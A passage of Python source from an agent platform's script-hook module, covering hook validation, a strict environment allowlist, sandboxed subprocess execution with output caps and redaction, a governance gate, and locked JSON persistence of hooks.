    return _GLOBAL_INLINE_FLAGS_RE.match(pattern) is not None


def _normalize_hook_timeout(value: object) -> int:
    """Coerce a persisted/edited timeout to an int within the allowed bounds.

    ``hooks.json`` is hand-editable and older files predate the 1–300 bound, so a
    missing / non-int / out-of-range value must degrade to a SAFE in-range value
    rather than propagate: ``None`` or junk → the default; a numeric value is
    clamped into ``[HOOK_TIMEOUT_MIN, HOOK_TIMEOUT_MAX]``. Used by ``from_dict``
    (fail-soft on load); the raising ``validate_hook_fields`` is what rejects a
    bad value at the create/update API boundary. A bool is rejected (``bool`` is
    an ``int`` subclass but ``True`` as a timeout is meaningless).
    """
    if isinstance(value, bool) or not isinstance(value, (int, float)):
        return HOOK_TIMEOUT_DEFAULT
    try:
        ivalue = int(value)
    except (ValueError, OverflowError):
        return HOOK_TIMEOUT_DEFAULT
    return max(HOOK_TIMEOUT_MIN, min(HOOK_TIMEOUT_MAX, ivalue))


def validate_hook_fields(
    *, event: str, timeout: object, command: str, skills: list, matcher: str, matcher_mode: str
) -> None:
    """Enforce the script-hook invariants at a WRITE boundary, raising on any breach.

    The single source of truth for what makes a hook well-formed, shared by
    ``ScriptHookStore.create`` and ``ScriptHookStore.update`` so a hook persisted
    by EITHER path is held to the same contract — closing the gap where the
    command+skills invariant, event membership, and timeout bounds were checked
    only in ``update``. Deserialization (``ScriptHook.from_dict``) does NOT call
    this: a malformed persisted hook must load fail-soft (normalized), never abort
    the whole store, so it uses the ``_normalize_hook_*`` helpers instead.

    Raises ``ValueError`` (which the dashboard handler maps to HTTP 400) when:

    * ``event`` is not one of ``HOOK_EVENTS``;
    * ``timeout`` is not an int in ``[1, 300]``;
    * neither ``command`` nor ``skills`` is present (an empty hook);
    * ``skills`` is combined with a ``command`` (the skills would never fire);
    * ``skills`` is paired with an event other than UserPromptSubmit/AgentSpawn
      (the "Load skills:" directive has no consumer there);
    * ``matcher_mode`` is ``regex`` with a syntactically invalid ``matcher``.
    """
    if event not in HOOK_EVENTS:
        raise ValueError(f"invalid event: {event}")
    if (
        isinstance(timeout, bool)
        or not isinstance(timeout, int)
        or not (HOOK_TIMEOUT_MIN <= timeout <= HOOK_TIMEOUT_MAX)
    ):
        raise ValueError(
            f"timeout must be an integer between {HOOK_TIMEOUT_MIN} and {HOOK_TIMEOUT_MAX}"
        )
    if not command and not skills:
        raise ValueError("either command or skills must be provided")
    if skills:
        if command:
            raise ValueError(
                "skills cannot be combined with a command — the skills would "
                "never fire; use a skills-only hook or drop the skills"
            )
        if event not in _SKILLS_ONLY_EVENTS:
            raise ValueError(
                f"skills hooks cannot fire on {event} events — "
                "choose UserPromptSubmit or AgentSpawn"
            )
    if matcher_mode == "regex" and matcher:
        try:
            re.compile(matcher)
        except re.error as exc:
            raise ValueError(f"invalid regex: {exc}") from None


# Env keys a script-hook subprocess may inherit from the gateway. A script hook
# runs an operator/agent-authored command through ``/bin/sh -c`` (POSIX) or
# ``cmd /c`` (Windows), so it needs only what the shell and an ordinary command
# require to run — an interpreter/tool on PATH, HOME, locale, TLS trust, and a
# proxy — plus the two hook-metadata variables injected below. Inheriting the
# whole gateway environment (``{**os.environ, ...}``) also handed every hook the
# gateway's AWS keys, model/provider keys, OAuth tokens, and connection strings,
# which a hostile or careless command could echo straight back through stdout,
# stderr, or the audit trail. This is the same strict-allowlist boundary the
# authenticated ``gh``/``glab`` spawns cross (``_PROVIDER_BASE_ENV_KEYS`` in
# ``dashboard/handlers/source_providers.py``); a variable a hook genuinely needs
# is added here by name, never by opening the gate to the whole environment. A
# key absent from the host environment is simply not forwarded — the allowlist
# is a filter, not a set of required keys — so a minimal container is unaffected.
_HOOK_BASE_ENV_KEYS: frozenset[str] = frozenset(
    {
        # A hook subprocess sees ONLY these ambient keys (plus the two
        # KIROCREW_HOOK_* metadata vars). A hook that depended on an ambient var
        # NOT listed here (e.g. VIRTUAL_ENV, PYTHONPATH, JAVA_HOME, AWS_PROFILE,
        # nvm/pyenv vars) will fail after upgrade with a "works in my terminal,
        # fails in the hook" symptom — the fix is to add that key here by name.
        # This fail-closed direction is deliberate: the allowlist is the
        # secret-egress boundary, so widening it is a per-key security decision.
        # Shell / command resolution. PATH is what lets ``/bin/sh -c "python …"``
        # find the interpreter; the Windows spellings mirror it there.
        "PATH",
        "PATHEXT",
        "COMSPEC",
        "SYSTEMROOT",
        # Home / user profile — a hook command that reads or writes under ``~``.
        "HOME",
        "HOMEDRIVE",
        "HOMEPATH",
        "USERPROFILE",
        "APPDATA",
        "LOCALAPPDATA",
        "XDG_CONFIG_HOME",
        # Data home — a hook that invokes the ``kirocrew`` CLI (or otherwise
        # reads the instance's data dir) must resolve the gateway's overridden
        # home, not the default ``~/.kiro/crew``. It is a path, not a credential,
        # so preserving it does not widen the secret-egress boundary this env
        # allowlist exists to close.
        "KIROCREW_HOME",
        # Temp dir — a hook that stages a scratch file.
        "TMPDIR",
        "TEMP",
        "TMP",
        # Locale — so a hook's output encoding matches the host.
        "LANG",
        "LC_ALL",
        # TLS trust may be required by network clients. Proxy URLs are omitted:
        # HTTP(S)_PROXY commonly embeds userinfo credentials, and script hooks
        # are an untrusted execution boundary. NO_PROXY carries host patterns,
        # not credentials, and is safe to preserve.
        "SSL_CERT_DIR",
        "SSL_CERT_FILE",
        "NO_PROXY",
        "no_proxy",
    }
)


def _hook_subprocess_env(hook: "ScriptHook", context: str) -> dict[str, str]:
    """Build the environment a script-hook subprocess runs with.

    A strict allowlist over ``os.environ`` (``_HOOK_BASE_ENV_KEYS``) plus the two
    hook-metadata variables the hook contract exposes — never a copy of the whole
    gateway environment, which would leak the gateway's credentials to every hook
    command (see ``_HOOK_BASE_ENV_KEYS``). The metadata variables are set LAST so
    a same-named ambient variable can never shadow them.

    ``KIROCREW_HOOK_CONTEXT`` is capped for a Stop event only: the env var is
    bounded by ARG_MAX (~32K on Windows), and a multi-KB Stop segment there can
    fail subprocess creation. The full context still reaches the hook via the
    stdin JSON payload (``Stop -> hook_event["assistant_text"]``) and drove
    matcher evaluation, so the cap loses nothing the hook cannot recover.
    """
    env = {k: v for k, v in os.environ.items() if k in _HOOK_BASE_ENV_KEYS}
    env["KIROCREW_HOOK_EVENT"] = hook.event
    env["KIROCREW_HOOK_CONTEXT"] = context[:500] if hook.event == HOOK_EVENT_STOP else context
    return env


@dataclass
class ScriptHook:
    """Executable hook that runs a shell command on a trigger event.

    Aligned with Kiro CLI hook semantics:
    - Exit 0: success (stdout → context for AgentSpawn/UserPromptSubmit)
    - Exit 2: block tool (PreToolUse only, stderr → LLM)
    - Other: warning (stderr shown to user)
    """

    id: str = ""
    name: str = ""
    event: str = HOOK_EVENT_USER_PROMPT_SUBMIT
    matcher: str = ""  # tool matcher for PreToolUse/PostToolUse (empty = all tools)
    matcher_mode: str = (
        "glob"  # "glob" (fnmatch, default), "regex" (re.search), "contains" (case-insensitive pipe-delimited substrings)
    )
    command: str = ""  # shell command to execute
    skills: list = field(
        default_factory=list
    )  # skill keys to inject when matched (no subprocess needed)
    timeout: int = 30  # seconds (Kiro CLI default is 30s)
    enabled: bool = True
    last_run: float = 0.0
    last_status: str = ""  # "ok", "error", "timeout", "blocked"
    last_error: str = ""  # human-readable reason for the most recent non-ok status
    run_count: int = 0

    def to_dict(self) -> dict:
        return asdict(self)

    @classmethod
    def from_dict(cls, data: dict) -> "ScriptHook":
        # Support legacy "pattern" field as fallback for "matcher"
        matcher = data.get("matcher", data.get("pattern", ""))
        skills_raw = data.get("skills", [])
        skills = skills_raw if isinstance(skills_raw, list) else []
        # Redact + truncate a persisted last_error on load: hooks.json is
        # operator-writable and an agent-written (or hand-edited) error can carry
        # a credential. It flows from_dict() -> /api/hooks -> the dashboard
        # InfoTip, so it is an output boundary and must be scrubbed here too, not
        # only at write time. Non-string values default to "".
        raw_last_error = data.get("last_error", "")
        last_error = (
            redact_via_context(raw_last_error)[:500]
            if isinstance(raw_last_error, str) and raw_last_error
            else ""
        )
        # Normalize the timeout on load. hooks.json is hand-editable and older
        # files predate the 1–300 bound, so a missing / non-int / out-of-range
        # value is clamped to a safe in-range value here rather than persisted
        # verbatim to later fire a 0-second (immediate) or unbounded timeout.
        # Deserialization is fail-soft on purpose (a malformed hook must load,
        # not abort the whole store); the raising `validate_hook_fields` is what
        # rejects a bad value at the create/update boundary. `event` is left as
        # written so an unknown event is visibly inert rather than silently
        # remapped, matching how `matcher_mode` junk falls through to glob.
        timeout = _normalize_hook_timeout(data.get("timeout", HOOK_TIMEOUT_DEFAULT))
        return cls(
            id=data.get("id", str(uuid.uuid4())[:8]),
            name=data.get("name", ""),
            event=data.get("event", HOOK_EVENT_USER_PROMPT_SUBMIT),
            matcher=matcher,
            matcher_mode=data.get("matcher_mode", "glob"),
            command=data.get("command", ""),
            skills=[str(s) for s in skills if isinstance(s, str)],
            timeout=timeout,
            enabled=data.get("enabled", True),
            last_run=data.get("last_run", 0.0),
            last_status=data.get("last_status", ""),
            last_error=last_error,
            run_count=data.get("run_count", 0),
        )


# ── Script hook output caps ──
#
# ``run_script_hook`` used to ``await proc.communicate(...)``, which buffers
# BOTH pipes in memory until EOF: a buggy or hostile hook could emit unbounded
# stdout/stderr and OOM (or stall) the gateway for every session before the
# 500-char presentation limit was ever applied (#5442). We now drain each
# stream incrementally and keep only the first ``_HOOK_STREAM_CAP_BYTES`` bytes,
# while continuing to read (and discard) the rest so the child can never block
# on a full pipe. The cap is generously above the 500-char field we surface, so
# the retained prefix is always enough to decode and truncate for display, yet
# small enough that a runaway hook cannot exhaust memory.
_HOOK_STREAM_CAP_BYTES = 64 * 1024
# Marker appended to a decoded stream when its raw bytes exceeded the cap, so
# truncation is visible rather than silent.
_HOOK_TRUNCATION_MARKER = "\n…[output truncated]"


async def _read_capped_stream(
    reader: "asyncio.StreamReader | None", cap: int
) -> tuple[bytes, bool]:
    """Drain *reader* fully, retaining at most *cap* bytes.

    Returns ``(retained_bytes, truncated)``. Bytes beyond *cap* are read and
    discarded so the child never blocks on a full OS pipe buffer (the deadlock
    ``communicate`` avoided by buffering everything — we avoid it by consuming
    everything, but only *keeping* a bounded prefix). Chunked reads keep peak
    memory at roughly ``cap`` regardless of how much the child writes.
    """
    if reader is None:
        return b"", False
    retained = bytearray()
    truncated = False
    while True:
        # A fixed read size bounds a single chunk; the loop bounds the total.
        chunk = await reader.read(65536)
        if not chunk:
            break
        if len(retained) < cap:
            room = cap - len(retained)
            retained.extend(chunk[:room])
            if len(chunk) > room:
                truncated = True
        else:
            # Already at cap — keep draining so the pipe drains, drop the bytes.
            truncated = True
    return bytes(retained), truncated


def _decode_capped(raw: bytes, truncated: bool) -> str:
    """Decode capped raw bytes, appending the truncation marker when clipped.

    ``errors="replace"`` handles a multibyte sequence severed at the cap
    boundary: the trailing partial code point becomes U+FFFD rather than raising
    or silently dropping, so a UTF-8 stream clipped mid-character still decodes
    to a stable, safe string.
    """
    text = raw.decode(errors="replace")
    if truncated:
        text += _HOOK_TRUNCATION_MARKER
    return text


async def _communicate_capped(
    proc: "asyncio.subprocess.Process", stdin_data: bytes, cap: int
) -> tuple[bytes, bool, bytes, bool]:
    """Write *stdin_data*, then drain stdout and stderr concurrently under a cap.

    Concurrent draining (vs. sequential) is required for the same reason
    ``communicate`` reads both pipes at once: a child that fills stderr while we
    are still reading stdout would deadlock if we did not consume stderr in
    parallel. Returns ``(stdout, stdout_truncated, stderr, stderr_truncated)``.
    """

    async def _feed_stdin() -> None:
        stdin = proc.stdin
        if stdin is None:
            return
        try:
            stdin.write(stdin_data)
            await stdin.drain()
        except (BrokenPipeError, ConnectionResetError):
            # The hook may exit without reading stdin; that is not our error.
            pass
        finally:
            try:
                stdin.close()
            except Exception:
                pass

    stdin_task = asyncio.ensure_future(_feed_stdin())
    stdout_task = asyncio.ensure_future(_read_capped_stream(proc.stdout, cap))
    stderr_task = asyncio.ensure_future(_read_capped_stream(proc.stderr, cap))
    try:
        (stdout_b, stdout_trunc), (stderr_b, stderr_trunc) = await asyncio.gather(
            stdout_task, stderr_task
        )
        await stdin_task
        await proc.wait()
    except BaseException:
        # On timeout (CancelledError from wait_for) or any failure, cancel and
        # OBSERVE every helper before returning control to the reap path. Merely
        # calling cancel() leaves the StreamReader with an active waiter, so a
        # cleanup read can raise "read() called while another coroutine is
        # already waiting" and leak the process.
        for task in (stdin_task, stdout_task, stderr_task):
            task.cancel()
        await asyncio.gather(stdin_task, stdout_task, stderr_task, return_exceptions=True)
        raise
    return stdout_b, stdout_trunc, stderr_b, stderr_trunc


@dataclass
class ScriptHookResult:
    """Result of executing a script hook."""

    hook_id: str
    hook_name: str
    event: str
    stdout: str = ""
    stderr: str = ""
    exit_code: int = -1
    error: str = ""
    duration_ms: int = 0

    @property
    def blocked(self) -> bool:
        """PreToolUse exit code 2 = block tool."""
        return self.exit_code == 2

    @property
    def succeeded(self) -> bool:
        return self.exit_code == 0


def _script_hooks_capability_denied(session_key: str = "") -> str | None:
    """Return a denial reason if governance disables ``capabilities.script_hooks``.

    Script hooks run an operator/agent-authored shell command in a subprocess
    (``run_script_hook`` → ``/bin/sh -c``), an arbitrary code-execution surface.
    The ``capabilities.script_hooks`` gate (default OFF in the catalog) lets a
    policy/profile forbid firing them.  Best-effort beyond the always-on
    sandbox/redaction guards: a ``PlatformCompositionError`` propagates
    (fail-closed CPP); any other error degrades to "no opinion" (None) so a
    transient governance glitch cannot wedge every hook.
    """
    from kiro_crew.platform.context import PlatformCompositionError

    try:
        from kiro_crew.platform.governance_profiles import governance_permits

        # item="" → the CapabilityGate's ``enabled`` flag is what is queried.
        decision = governance_permits("capabilities.script_hooks", "", session_key=session_key)
        if not getattr(decision, "permitted", True):
            return getattr(decision, "reason", "script_hooks capability disabled")
        return None
    except PlatformCompositionError:
        raise
    except Exception:
        # Wrapped (see _governance_denial): a late-import failure must not turn the
        # soft fail-open into a hard fail that wedges every script hook.
        try:
            from kiro_crew.platform.governance_profiles import audit_governance_degraded

            audit_governance_degraded(
                "run_script_hook", session_key=session_key, scope="capabilities.script_hooks"
            )
        except Exception:
            logger.debug("governance degrade audit unavailable", exc_info=True)
        return None


def _audit_governance_hook_decision(
    session_key: str, hook_label: str, outcome: str, reason: str
) -> None:
    """Best-effort SEL audit for a script/skills-only hook governance decision.

    Shared by both ``run_script_hook`` and the skills-only path in ``fire()`` to
    avoid duplicating the try/import/call pattern at every call site.
    """
    try:
        sel().log_governance_decision(
            session_key=session_key,
            tool_name=hook_label,
            scope="capabilities.script_hooks",
            outcome=outcome,
            reason=reason,
        )
    except Exception:
        logger.debug("hook governance audit (%s) failed", outcome, exc_info=True)


async def run_script_hook(
    hook: ScriptHook, context: str = "", hook_event: dict | None = None
) -> ScriptHookResult:
    """Execute a script hook's command with timeout.

    Passes hook event as JSON via STDIN (Kiro CLI compatible).
    """
    start = time.monotonic()
    # Governance: the ``capabilities.script_hooks`` gate (default OFF) may forbid
    # running script hooks for the active surface. Checked before the subprocess
    # spawns. The session key is carried on the hook_event when a caller threads
    # it (parent_session_key); absent → policy-only resolution.
    sk = ""
    if hook_event:
        sk = str(hook_event.get("parent_session_key") or hook_event.get("session_key") or "")
    gov_denied = _script_hooks_capability_denied(sk)
    if gov_denied:
        hook.last_run = time.time()
        hook.last_status = "blocked"
        hook.last_error = f"Blocked by governance: {gov_denied}"
        hook.run_count += 1
        _audit_governance_hook_decision(
            sk, f"run_script_hook:{hook.name or hook.id}", "denied", gov_denied
        )
        return ScriptHookResult(
            hook_id=hook.id,
            hook_name=hook.name,
            event=hook.event,
            error=f"Blocked by governance policy: {gov_denied}",
            exit_code=2,  # PreToolUse "block tool" convention
            duration_ms=int((time.monotonic() - start) * 1000),
        )
    # Build hook event JSON for STDIN
    if hook_event is None:
        hook_event = {"hook_event_name": hook.event, "cwd": os.getcwd()}
    stdin_data = json.dumps(hook_event).encode()

    try:
        # circular import: sandbox → registry → apps → hooks, so import at call time
        from kiro_crew.sandbox import (
            create_subprocess_limited,
            sandboxed_spawn_argv,
            sandboxed_spawn_argv_async,
        )

        # A script hook inherits only the minimum env its shell + command need
        # (``_HOOK_BASE_ENV_KEYS``) plus the two hook-metadata variables — NOT a
        # copy of the whole gateway environment, which would expose the gateway's
        # AWS/model/OAuth/connection-string credentials to every hook command.
        env = _hook_subprocess_env(hook, context)
        # Shell per platform: POSIX /bin/sh -c, Windows cmd /c (no /bin/sh there).
        # The argv is what the sandbox/cgroup chokepoints below vet, on BOTH
        # platforms — only the eventual spawn form differs (see the Windows
        # branch under the spawn).
        if platform_compat.IS_WINDOWS:
            argv = ["cmd", "/c", hook.command]
        else:
            argv = ["/bin/sh", "-c", hook.command]
        # Route argv and the strict hook allowlist through the shared spawn
        # funnel. Besides filesystem isolation and cgroup limits, this lets an
        # outer systemd-run wrapper receive its user-bus locators while inserting
        # an inner `env -u` shim that removes them before the hook command execs.
        # Calling wrap_argv + cgroup_scope_argv directly would give the wrapper
        # the child-safe allowlist and make it fail before a PreToolUse policy
        # hook could run.
        wrapped_argv, env, cleanup_path = await sandboxed_spawn_argv_async(
            argv, env=env, _prepare=sandboxed_spawn_argv
        )
        # Process-group isolation for clean tree-kill on timeout. Pass both flags
        # explicitly (NOT **dict unpack — breaks mypy's Popen overload resolution
        # on the build fleet): start_new_session=True is a no-op on Windows,
        # creationflags resolves to 0 (no-op) on POSIX. The Windows flag makes the
        # tree taskkill /T-reapable; POSIX setsid -> killpg.
        if platform_compat.IS_WINDOWS and wrapped_argv == argv:
            # cmd.exe must receive the operator's command line VERBATIM. Spawning
            # ``["cmd", "/c", command]`` as an argv routes it through
            # ``subprocess.list2cmdline``, which backslash-escapes every quote the
            # operator wrote — so a command as ordinary as
            # ``"C:\Program Files\Python\python.exe" -c "print(1)"`` arrives as
            # ``\"C:\Program Files\...\"`` and cmd.exe answers "is not recognized
            # as an internal or external command". ``create_subprocess_shell``
            # formats ``%ComSpec% /c "<command>"`` with no argv escaping, which is
            # the same parse the operator gets typing the line at a prompt (and
            # the only form under which ``%VAR%`` and a literal ``%`` both behave
            # as written — a temp ``.cmd`` wrapper would eat both).
            #
            # Guarded on the wrap being a no-op: Windows has no sandbox or cgroup
            # backend, so neither chokepoint can prepend anything today. Should
            # one ever appear, the wrapper MUST own the spawn — that case falls
            # through to the argv path below, choosing isolation over quoting.
            proc = await asyncio.create_subprocess_shell(
                hook.command,
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env=env,
                creationflags=platform_compat.CREATE_NEW_PROCESS_GROUP,
            )
        else:
            proc = await create_subprocess_limited(
                *wrapped_argv,
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env=env,
                start_new_session=platform_compat.IS_POSIX,
                creationflags=platform_compat.CREATE_NEW_PROCESS_GROUP,
            )
        try:
            (
                stdout_b,
                stdout_trunc,
                stderr_b,
                stderr_trunc,
            ) = await asyncio.wait_for(
                _communicate_capped(proc, stdin_data, _HOOK_STREAM_CAP_BYTES),
                timeout=hook.timeout,
            )
        finally:
            if cleanup_path:
                try:
                    os.unlink(cleanup_path)
                except OSError:
                    pass
        elapsed = int((time.monotonic() - start) * 1000)
        exit_code = proc.returncode or 0
        # Decode with the upstream byte cap (#5442) so redaction never sees an
        # unbounded string, THEN redact the full capped streams through the
        # canonical companion-aware shim before any truncation or return
        # (#5441). Both fields are returned by the test API, and stdout can also
        # become model context for prompt/spawn hooks; redacting the capped text
        # first prevents a credential that straddles a presentation boundary
        # (e.g. the 500-char stderr cut for last_error, #4708) from leaking as
        # an unredacted fragment.
        stdout_text = _decode_capped(stdout_b, stdout_trunc).strip()
        stderr_text = _decode_capped(stderr_b, stderr_trunc).strip()
        stdout_safe = redact_via_context(stdout_text) if stdout_text else ""
        stderr_safe_full = redact_via_context(stderr_text) if stderr_text else ""
        stderr_safe = stderr_safe_full[:500]
        hook.last_run = time.time()
        if exit_code == 2:
            hook.last_status = "blocked"
            hook.last_error = stderr_safe or "Blocked (exit 2)"
        elif exit_code == 0:
            hook.last_status = "ok"
            hook.last_error = ""
        else:
            hook.last_status = "error"
            hook.last_error = stderr_safe or f"Exited with code {exit_code}"
        hook.run_count += 1
        return ScriptHookResult(
            hook_id=hook.id,
            hook_name=hook.name,
            event=hook.event,
            stdout=stdout_safe,
            stderr=stderr_safe_full,
            exit_code=exit_code,
            duration_ms=elapsed,
        )
    except asyncio.TimeoutError:
        # Kill the whole process tree (shell + grandchildren) to prevent orphans.
        # platform_compat: killpg on POSIX, taskkill /T on Windows (os.killpg /
        # signal.SIGKILL are POSIX-only and would AttributeError on win32).
        try:
            if proc.returncode is None:
                # Async variant offloads the Windows taskkill spawn — the hook
                # timeout path already runs on the event loop, so we never want
                # to stall it further while taskkill.exe walks the tree
                await platform_compat.kill_process_tree_async(proc.pid, platform_compat.SIGKILL)
                # Reap the killed tree WITHOUT re-buffering: a hook that timed
                # out having already flooded its pipes must not be able to OOM
                # us during cleanup (#5442). Drain both pipes concurrently under
                # the same cap and discard; sequential reads can deadlock when
                # residual data fills the other pipe.
                await asyncio.gather(
                    _read_capped_stream(proc.stdout, _HOOK_STREAM_CAP_BYTES),
                    _read_capped_stream(proc.stderr, _HOOK_STREAM_CAP_BYTES),
                )
                await proc.wait()
        except Exception:
            pass
        elapsed = int((time.monotonic() - start) * 1000)
        hook.last_run = time.time()
        hook.last_status = "timeout"
        hook.last_error = f"Timed out after {hook.timeout}s"
        hook.run_count += 1
        return ScriptHookResult(
            hook_id=hook.id,
            hook_name=hook.name,
            event=hook.event,
            error=f"Timed out after {hook.timeout}s",
            duration_ms=elapsed,
        )
    except Exception as exc:
        elapsed = int((time.monotonic() - start) * 1000)
        safe_error = redact_via_context(str(exc))
        hook.last_run = time.time()
        hook.last_status = "error"
        hook.last_error = safe_error[:500]
        hook.run_count += 1
        return ScriptHookResult(
            hook_id=hook.id,
            hook_name=hook.name,
            event=hook.event,
            error=safe_error,
            duration_ms=elapsed,
        )


# ── Script Hook Store (persistence) ──

_HOOKS_FILE = "hooks.json"


class ScriptHookStore:
    """Persist script hooks to ~/.kiro/crew/hooks.json."""

    def __init__(self, config_dir: Path | None = None):
        from kiro_crew.config.loader import config_dir as _cfg_dir

        self._dir = config_dir or _cfg_dir()
        self._path = self._dir / _HOOKS_FILE
        self._hooks: dict[str, ScriptHook] = {}
        # Entries that cannot be deserialized must remain inert, but they still
        # belong to the user. Preserve their raw JSON values across later status
        # and CRUD writes so fail-soft loading does not become silent data loss.
        self._unparsed_hook_entries: list[object] = []
        # Mutations used to be implicitly serialised by running on the single
        # event-loop thread. They are now offloaded with asyncio.to_thread (the
        # persistence takes a file lock and fsyncs, which must not block the
        # loop), so two of them can genuinely interleave: A mutates, B mutates,
        # B persists, then A persists a snapshot taken BEFORE B's change and
        # drops it. Re-entrant because the persist path is called from inside
        # the same held section.
        self._mutex = threading.RLock()
        self._load()

    def _load(self) -> None:
        if not self._path.exists():
            return
        try:
            data = json.loads(self._path.read_text(encoding="utf-8"))
        except (json.JSONDecodeError, OSError) as exc:
            logger.warning("Failed to load hooks: %s", exc)
            return
        # Deserialize each hook independently: a single malformed entry (a
        # non-dict, or a dict `from_dict` cannot coerce) must not take down the
        # whole store and drop every OTHER hook the user has. `from_dict` is
        # already fail-soft (it normalizes junk fields), so a raise here would be
        # unexpected — but a foreign / hand-corrupted entry is possible, so keep
        # it inert and preserve its raw value for future rewrites.
        #
        # A malformed root or `hooks` collection cannot be represented by the
        # list-shaped store. Keep it inert so gateway startup remains available;
        # `_write_hooks_file` validates the locked, current bytes and refuses any
        # mutation rather than overwriting data the store cannot preserve.
        if not isinstance(data, dict):
            logger.warning("Failed to load hooks: root is not an object")
            return
        hooks_data = data.get("hooks", [])
        if not isinstance(hooks_data, list):
            logger.warning("Failed to load hooks: hooks collection is not a list")
            return

        for h in hooks_data:
            try:
                if not isinstance(h, dict):
                    raise TypeError("hook entry is not an object")
                if h.get("event", HOOK_EVENT_USER_PROMPT_SUBMIT) not in HOOK_EVENTS:
                    raise ValueError("hook entry has an invalid event")
                hook = ScriptHook.from_dict(h)
                # Keep insertion inside the per-entry guard: a hand-edited ID
                # can be an unhashable list/dict even when from_dict succeeds.
                self._hooks[hook.id] = hook
            except Exception:
                logger.warning("Skipping unparseable hook entry", exc_info=True)
                self._unparsed_hook_entries.append(h)
                continue

    def _save(self) -> None:
        self._write_hooks_file(
            [
                *(h.to_dict() for h in self._hooks.values()),
                *self._unparsed_hook_entries,
            ]
        )

    def _write_hooks_file(self, hooks_data: Sequence[object]) -> None:
        """Write the ``hooks`` list while PRESERVING every other top-level key.

        ``hooks.json`` is shared: this store owns the ``hooks`` key, but the
        ``register_hook`` MCP tool stores webhook resume contexts as top-level
        keys (one per hook id) in the same file. Writing ``{"hooks": [...]}``
        wholesale used to erase all of them, so any script-hook create / update /
        toggle / delete silently dropped every pending webhook context. Merge
        instead of replace.

        An unreadable file ABORTS the write rather than proceeding with "no
        foreign keys". Continuing was the earlier choice, on the reasoning that
        the script hooks were still recoverable — but the foreign keys are not:
        a corrupt read means their contents are unknown, and writing the merged
        result would replace the file with only what this store happens to hold,
        permanently erasing every registered webhook context. Refusing leaves
        both sets on disk for an operator to repair. The caller sees
        :class:`webhooks.WebhookStoreUnreadable`.

        The read-merge-write runs under the SAME ``hooks.json.lock`` the other
        writers take, and lands via atomic replace. Merging without the lock
        still loses data, just through a narrower window: a ``register_hook``
        call that commits between this read and this write is erased by the
        stale snapshot.
        """
        self._dir.mkdir(parents=True, exist_ok=True)
        with webhooks.locked(self._path):
            data: dict = {}
            if self._path.exists():
                try:
                    loaded = json.loads(self._path.read_text(encoding="utf-8"))
                    if not isinstance(loaded, dict):
                        raise webhooks.WebhookStoreUnreadable(
                            f"{self._path.name} root is not an object; refusing to overwrite it"
                        )
                    if "hooks" in loaded and not isinstance(loaded["hooks"], list):
                        raise webhooks.WebhookStoreUnreadable(
                            f"{self._path.name} hooks collection is not a list; "
                            "refusing to overwrite it"
                        )
                    data = {k: v for k, v in loaded.items() if k != "hooks"}
                except webhooks.WebhookStoreUnreadable:
                    raise
                except (json.JSONDecodeError, OSError) as exc:
                    logger.warning("hooks.json unreadable, refusing to overwrite it: %s", exc)
                    raise webhooks.WebhookStoreUnreadable(
                        f"{self._path.name} is unreadable; refusing to overwrite it "
                        "and erase the registered webhook contexts"
                    ) from exc
            data["hooks"] = hooks_data
            webhooks.write_json_atomic(self._path, data)

    def list_all(self) -> list[ScriptHook]:
        return list(self._hooks.values())

    def get(self, hook_id: str) -> ScriptHook | None:
        return self._hooks.get(hook_id)

    @contextmanager
    def _atomic_mutation(self):
        """Undo the in-memory change if persistence fails.

        ``_save`` refuses to overwrite an unreadable ``hooks.json`` rather than
        erasing the webhook contexts kept in the same file, and the write itself
        can fail on a full or read-only disk. Every mutation below edits
        ``self._hooks`` first, so without this the process would keep serving a
        change that never reached disk — a hook toggled on would keep firing, a
        deleted one would keep existing — while the API reported 503.

        A deep copy is used because ``update`` and ``toggle`` mutate the stored
        ``ScriptHook`` in place; a shallow dict copy would share those objects and
        restore nothing. The set is small (tens of hooks), so the copy is cheap
        next to the fsync it guards.
        """
        snapshot = copy.deepcopy(self._hooks)
        try:
            yield
        except BaseException:
            self._hooks = snapshot
            raise

    def create(self, data: dict) -> ScriptHook:
        hook = ScriptHook.from_dict(data)
        if not hook.id:
            hook.id = str(uuid.uuid4())[:8]
        # Enforce the SAME invariants `update` does, via the shared validator:
        # a direct/internal caller of `create` used to bypass the command+skills
        # invariant, event membership, and timeout bounds (only `update` checked
        # them), so it could persist a hook the update path would reject and that
        # later silently fails to fire. `from_dict` clamps the timeout on the way
        # in, but validate against the ORIGINAL `data` so a caller that passed an
        # out-of-range timeout is told rather than having it silently clamped —
        # matching the API schema's reject-don't-clamp behavior. Raises
        # ValueError (mapped to HTTP 400 by the dashboard handler).
        validate_hook_fields(
            event=hook.event,
            timeout=data.get("timeout", hook.timeout),
            command=hook.command,
            skills=hook.skills,
            matcher=hook.matcher,
            matcher_mode=hook.matcher_mode,
        )
        with self._mutex, self._atomic_mutation():
            self._hooks[hook.id] = hook
            self._save()
        return hook

    def update(self, hook_id: str, data: dict) -> ScriptHook | None:
        with self._mutex, self._atomic_mutation():
            hook = self._hooks.get(hook_id)
            if not hook:
                return None
            for k in ("name", "event", "matcher", "matcher_mode", "command", "timeout", "enabled"):
                if k in data:
                    setattr(hook, k, data[k])
            if "skills" in data:
                skills_raw = data["skills"]
                hook.skills = (
                    [str(s) for s in skills_raw if isinstance(s, str)]
                    if isinstance(skills_raw, list)
                    else []
                )
            # Validate the MERGED hook through the shared validator — the same
            # one `create` uses — so both write paths enforce one contract:
            # event membership, timeout bounds, the command+skills invariant and
            # its event pairing, and regex syntax. Validating post-merge (not the
            # request dict) is what catches a partial update that would otherwise
            # bypass a schema check keyed on the request — e.g. a matcher sent
            # without its matcher_mode, or skills added to a hook already on a
            # tool event. Raises ValueError (mapped to HTTP 400 by the handler).
            validate_hook_fields(
                event=hook.event,
                timeout=hook.timeout,
                command=hook.command,
                skills=hook.skills,
                matcher=hook.matcher,
                matcher_mode=hook.matcher_mode,
            )
            self._save()
        return hook

    def delete(self, hook_id: str) -> bool:
        with self._mutex, self._atomic_mutation():
            if hook_id in self._hooks:
                del self._hooks[hook_id]
                self._save()
                return True
        return False

    def toggle(self, hook_id: str) -> ScriptHook | None:
        with self._mutex, self._atomic_mutation():
            hook = self._hooks.get(hook_id)
            if not hook:
                return None
            hook.enabled = not hook.enabled
            self._save()
        return hook

    async def fire(
        self,
        event: str,
        context: str = "",
        tool_name: str = "",
        tool_input: dict | None = None,
        tool_response: dict | None = None,
